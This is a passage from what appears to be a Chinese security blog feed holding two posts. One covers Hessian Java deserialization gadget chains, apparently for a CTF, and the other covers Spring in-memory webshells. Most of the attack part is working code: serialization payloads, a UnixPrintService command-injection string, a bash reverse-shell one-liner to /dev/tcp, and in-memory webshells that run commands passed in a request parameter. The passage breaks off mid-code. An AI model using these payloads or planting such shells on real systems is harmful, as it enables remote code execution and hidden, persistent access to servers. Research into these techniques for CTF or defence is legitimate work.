uiDefaults2.put(<span class="hljs-string">&quot;_&quot;</span>, slz);        HashMap hashMap = make<span class="hljs-constructor">Map(<span class="hljs-params">uiDefaults1</span>,<span class="hljs-params">uiDefaults2</span>)</span>;        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        Hessian2Output oo = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">bos</span>)</span>;        oo.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;        oo.write<span class="hljs-constructor">Object(<span class="hljs-params">hashMap</span>)</span>;        oo.flush<span class="hljs-literal">()</span>;        ByteArrayInputStream bai = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">bos</span>.<span class="hljs-params">toByteArray</span>()</span>);        Hessian2Input hessian2Input = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Input(<span class="hljs-params">bai</span>)</span>;        hessian2Input.read<span class="hljs-constructor">Object()</span>;    &#125;    public static HashMap&lt;Object, Object&gt; makeMap ( Object v1, Object v2 ) throws Exception &#123;        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;        Class&lt;?&gt; nodeC;        <span class="hljs-keyword">try</span> &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;        &#125; catch (ClassNotFoundException e) &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;        &#125;        Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;        nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v1</span>, <span class="hljs-params">v1</span>, <span class="hljs-params">null</span>)</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">1</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v2</span>, <span class="hljs-params">v2</span>, <span class="hljs-params">null</span>)</span>);        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;        return s;    &#125;    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">name</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;&#125;</code></pre></div><p>调用栈</p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">invoke:</span><span class="hljs-number">275</span>, MethodUtil (sun.reflect.misc)<span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<span class="hljs-symbol">invoke:</span><span class="hljs-number">498</span>, Method (java.lang.reflect)<span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<span class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<span class="hljs-symbol">equals:</span><span class="hljs-number">814</span>, Hashtable (java.util)<span class="hljs-symbol">putVal:</span><span class="hljs-number">635</span>, HashMap (java.util)<span class="hljs-symbol">put:</span><span class="hljs-number">612</span>, HashMap (java.util)<span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<span class="hljs-symbol">readMap:</span><span class="hljs-number">538</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<span class="hljs-symbol">readObject:</span><span class="hljs-number">2110</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)</code></pre></div><p>最后使用<code>bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>反弹shell即可</p><h2 id="相关题目存个payload"><a href="#相关题目存个payload" class="headerlink" title="相关题目存个payload"></a>相关题目存个payload</h2><h3 id="sun-print-UnixPrintService的利用"><a href="#sun-print-UnixPrintService的利用" class="headerlink" title="sun.print.UnixPrintService的利用"></a>sun.print.UnixPrintService的利用</h3><p>因为可以不用实现序列化接口，所以找getter和命令执行的类就行</p><p>用方式就是简单命令拼接执行（缺点就是太能弹了，基本上每个get方法都能弹）</p><div class="code-wrapper"><pre><code class="hljs reasonml">Constructor&lt;UnixPrintService&gt; declaredConstructor = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnixPrintService</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredConstructor(String.<span class="hljs-params">class</span>)</span>;declaredConstructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;ObjectBean delegate = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectBean(<span class="hljs-params">sun</span>.<span class="hljs-params">print</span>.UnixPrintService.<span class="hljs-params">class</span>,<span class="hljs-params">declaredConstructor</span>.<span class="hljs-params">newInstance</span>(<span class="hljs-string">&quot;;open -na Calculator&quot;</span>)</span>);ObjectBean root  = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectBean(ObjectBean.<span class="hljs-params">class</span>, <span class="hljs-params">delegate</span>)</span>;HashMap&lt;Object, Object&gt; map = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JDKUtil</span>.</span></span>make<span class="hljs-constructor">Map(<span class="hljs-params">root</span>, <span class="hljs-params">root</span>)</span>;<span class="hljs-comment">//</span>ByteArrayOutputStream os = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;Hessian2Output output = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">os</span>)</span>;<span class="hljs-comment">//HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();</span><span class="hljs-comment">//sf.setAllowNonSerializable(true);</span><span class="hljs-comment">//output.setSerializerFactory(sf);</span>output.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;output.write<span class="hljs-constructor">Object(<span class="hljs-params">map</span>)</span>;output.get<span class="hljs-constructor">BytesOutputStream()</span>.flush<span class="hljs-literal">()</span>;output.complete<span class="hljs-constructor">Message()</span>;output.close<span class="hljs-literal">()</span>;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-keyword">new</span> <span class="hljs-constructor">String(Base64.<span class="hljs-params">getEncoder</span>()</span>.encode(os.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>)));</code></pre></div><h3 id="web服务由com-sun-net-httpserver实现时的内存马"><a href="#web服务由com-sun-net-httpserver实现时的内存马" class="headerlink" title="web服务由com.sun.net.httpserver实现时的内存马"></a>web服务由com.sun.net.httpserver实现时的内存马</h3><p>同样是获取线程</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpContext;<span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;<span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Yyds</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange t)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Y4tacker&#x27;s MemoryShell&quot;</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> t.getRequestURI().getQuery();        String[] var3 = query.split(<span class="hljs-string">&quot;=&quot;</span>);        System.out.println(var3[<span class="hljs-number">0</span>]+var3[<span class="hljs-number">1</span>]);        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">if</span> (var3[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;y4tacker&quot;</span>))&#123;            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(var3[<span class="hljs-number">1</span>]).getInputStream();            output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];            <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;            <span class="hljs-keyword">while</span> (-<span class="hljs-number">1</span> != (n = inputStream.read(buffer))) &#123;                output.write(buffer, <span class="hljs-number">0</span>, n);            &#125;        &#125;        response+=(<span class="hljs-string">&quot;\n&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(output.toByteArray()));        t.sendResponseHeaders(<span class="hljs-number">200</span>, (<span class="hljs-type">long</span>)response.length());        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> t.getResponseBody();        os.write(response.getBytes());        os.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Yyds</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception  &#123;        <span class="hljs-built_in">super</span>();        <span class="hljs-keyword">try</span>&#123;            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> Thread.currentThread();            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(<span class="hljs-string">&quot;group&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            obj = field.get(obj);            field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);            field.setAccessible(<span class="hljs-literal">true</span>);            obj = field.get(obj);            Thread[] threads = (Thread[]) obj;            <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;                <span class="hljs-keyword">if</span> (thread.getName().contains(<span class="hljs-string">&quot;Thread-2&quot;</span>)) &#123;                    <span class="hljs-keyword">try</span> &#123;                        field = thread.getClass().getDeclaredField(<span class="hljs-string">&quot;target&quot;</span>);                        field.setAccessible(<span class="hljs-literal">true</span>);                        obj = field.get(thread);                        System.out.println(obj);                        field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;this$0&quot;</span>);                        field.setAccessible(<span class="hljs-literal">true</span>);                        obj = field.get(obj);                        field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;contexts&quot;</span>);                        field.setAccessible(<span class="hljs-literal">true</span>);                        obj = field.get(obj);                        field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;list&quot;</span>);                        field.setAccessible(<span class="hljs-literal">true</span>);                        obj = field.get(obj);                        java.util.<span class="hljs-type">LinkedList</span> <span class="hljs-variable">lt</span> <span class="hljs-operator">=</span> (java.util.LinkedList)obj;                        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> lt.get(<span class="hljs-number">0</span>);                        field = o.getClass().getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);                        field.setAccessible(<span class="hljs-literal">true</span>);                        field.set(o,<span class="hljs-built_in">this</span>);                    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;                        e.printStackTrace();                    &#125;                &#125;            &#125;        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;        &#125;    &#125;&#125;</code></pre></div><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">被我忘掉的Hessian反序列化 - Boogiepop Doesn’t Laugh (boogipop.com)</a></p><p><a href="https://unk.org.cn/2023/10/08/hession/">unknown’s Blog</a></p><p>[TCTF2022 Hessian-onlyJdk - Boogiepop Doesn’t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/03/21/TCTF2022">https://boogipop.com/2023/03/21/TCTF2022</a> _ Hessian-onlyJdk&#x2F;)</p><p><a href="https://su18.org/post/hessian/">Hessian 反序列化知一二 | 素十八 (su18.org)</a>这位佬写的文章是真的细</p><p><a href="http://www.bmth666.cn/2023/02/07/0CTF-TCTF-2022-hessian-onlyJdk/">0CTF&#x2F;TCTF 2022 hessian-onlyJdk | Bmth’s blog (bmth666.cn)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>spring内存马</title>
    <link href="/2024/03/02/spring%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2024/03/02/spring%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="spring内存马"><a href="#spring内存马" class="headerlink" title="spring内存马"></a>spring内存马</h1><p>前提说一下各组件的触发顺序</p><p><code>Listen-&gt;Filter-&gt;Interceptor-&gt;controller</code></p><h2 id="Controller型"><a href="#Controller型" class="headerlink" title="Controller型"></a>Controller型</h2><h3 id="获取上下文"><a href="#获取上下文" class="headerlink" title="获取上下文"></a>获取上下文</h3><p>第一种：getCurrentWebApplicationContext()</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">// getCurrentWebApplicationContext方法获得的是一个XmlWebApplicationContext实例类型的Root WebApplicationContext。</span>WebApplicationContext WebApplicationContext context = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ContextLoader</span>.</span></span>get<span class="hljs-constructor">CurrentWebApplicationContext()</span>;</code></pre></div><p>第二种：WebApplicationContextUtils</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">// 通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦 </span>WebApplicationContext context = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WebApplicationContextUtils</span>.</span></span>get<span class="hljs-constructor">WebApplicationContext(RequestContextUtils.<span class="hljs-params">getWebApplicationContext</span>(((ServletRequestAttributes)</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RequestContextHolder</span>.</span></span>current<span class="hljs-constructor">RequestAttributes()</span>).get<span class="hljs-constructor">Request()</span>).get<span class="hljs-constructor">ServletContext()</span>);</code></pre></div><p>第三种：RequestContextUtils</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">// 通过 ServletRequest 类的实例来获得 Child WebApplicationContext</span> WebApplicationContext context = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RequestContextUtils</span>.</span></span>get<span class="hljs-constructor">WebApplicationContext(((ServletRequestAttributes)</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RequestContextHolder</span>.</span></span>current<span class="hljs-constructor">RequestAttributes()</span>).get<span class="hljs-constructor">Request()</span>);</code></pre></div><p>第四种：getAttribute</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">// 这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext </span>WebApplicationContext context = (WebApplicationContext)<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RequestContextHolder</span>.</span></span>current<span class="hljs-constructor">RequestAttributes()</span>.get<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, 0)</span>;</code></pre></div><p>Spring 2.5 开始到 Spring 3.1 之前一般使用<br>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping<br>映射器 ；<br>Spring 3.1 开始及以后一般开始使用新的<br>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping<br>映射器来支持@Contoller和@RequestMapping注解。<br>因此也就有分开的2条思路来注册controller</p><h3 id="spring4后直接用registermapping直接注册controller"><a href="#spring4后直接用registermapping直接注册controller" class="headerlink" title="spring4后直接用registermapping直接注册controller"></a>spring4后直接用registermapping直接注册controller</h3><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span>RequestMappingHandlerMapping r = context.get<span class="hljs-constructor">Bean(RequestMappingHandlerMapping.<span class="hljs-params">class</span>)</span>;<span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span>Method <span class="hljs-keyword">method</span> = (<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredMethods()</span>)<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;<span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span>PatternsRequestCondition url = <span class="hljs-keyword">new</span> <span class="hljs-constructor">PatternsRequestCondition(<span class="hljs-string">&quot;/hahaha&quot;</span>)</span>;<span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span>RequestMethodsRequestCondition ms = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RequestMethodsRequestCondition()</span>;<span class="hljs-comment">// 5. 在内存中动态注册 controller</span>RequestMappingInfo info = <span class="hljs-keyword">new</span> <span class="hljs-constructor">RequestMappingInfo(<span class="hljs-params">url</span>, <span class="hljs-params">ms</span>, <span class="hljs-params">null</span>, <span class="hljs-params">null</span>, <span class="hljs-params">null</span>, <span class="hljs-params">null</span>, <span class="hljs-params">null</span>)</span>;r.register<span class="hljs-constructor">Mapping(<span class="hljs-params">info</span>, Class.<span class="hljs-params">forName</span>(<span class="hljs-string">&quot;恶意Controller&quot;</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>, <span class="hljs-keyword">method</span>);</code></pre></div><h3 id="针对使用-DefaultAnnotationHandlerMapping-映射器的应用"><a href="#针对使用-DefaultAnnotationHandlerMapping-映射器的应用" class="headerlink" title="针对使用 DefaultAnnotationHandlerMapping 映射器的应用"></a>针对使用 DefaultAnnotationHandlerMapping 映射器的应用</h3><p>即Spring 2.5 开始到 Spring 3.1 之前</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span>context.get<span class="hljs-constructor">BeanFactory()</span>.register<span class="hljs-constructor">Singleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.<span class="hljs-params">forName</span>(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>);<span class="hljs-comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.get<span class="hljs-constructor">Bean(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">web</span>.<span class="hljs-params">servlet</span>.<span class="hljs-params">mvc</span>.<span class="hljs-params">annotation</span>.DefaultAnnotationHandlerMapping.<span class="hljs-params">class</span>)</span>;<span class="hljs-comment">// 3. 反射获得 registerHandler Method</span>java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractUrlHandlerMapping</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;registerHandler&quot;</span>, String.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>)</span>;m1.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<span class="hljs-comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span>m1.invoke(dh, <span class="hljs-string">&quot;/favicon&quot;</span>, <span class="hljs-string">&quot;dynamicController&quot;</span>);</code></pre></div><h3 id="针对使用-RequestMappingHandlerMapping-映射器的应用"><a href="#针对使用-RequestMappingHandlerMapping-映射器的应用" class="headerlink" title="针对使用 RequestMappingHandlerMapping 映射器的应用"></a>针对使用 RequestMappingHandlerMapping 映射器的应用</h3><div class="code-wrapper"><pre><code class="hljs reasonml">context.get<span class="hljs-constructor">BeanFactory()</span>.register<span class="hljs-constructor">Singleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.<span class="hljs-params">forName</span>(<span class="hljs-string">&quot;恶意Controller&quot;</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>);org.springframework.web.servlet.mvc.<span class="hljs-keyword">method</span>.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.get<span class="hljs-constructor">Bean(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">web</span>.<span class="hljs-params">servlet</span>.<span class="hljs-params">mvc</span>.<span class="hljs-params">method</span>.<span class="hljs-params">annotation</span>.RequestMappingHandlerMapping.<span class="hljs-params">class</span>)</span>;java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractHandlerMethodMapping</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;detectHandlerMethods&quot;</span>, Object.<span class="hljs-params">class</span>)</span>;m1.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;m1.invoke(requestMappingHandlerMapping, <span class="hljs-string">&quot;dynamicController&quot;</span>);</code></pre></div><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilController</span> &#123;    <span class="hljs-meta">@RequestMapping(&quot;/control&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Spring_Controller</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;        System.out.println(<span class="hljs-string">&quot;i am in&quot;</span>);        <span class="hljs-comment">//获取当前上下文环境</span>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);        <span class="hljs-comment">//手动注册Controller</span>        <span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例</span>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);        <span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="hljs-string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);        <span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);        <span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();        <span class="hljs-comment">// 5. 在内存中动态注册 controller</span>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);        r.registerMapping(info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Controller_Shell</span>(), method);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;                <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;                <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);                <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                    isLinux = <span class="hljs-literal">false</span>;                &#125;                String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span 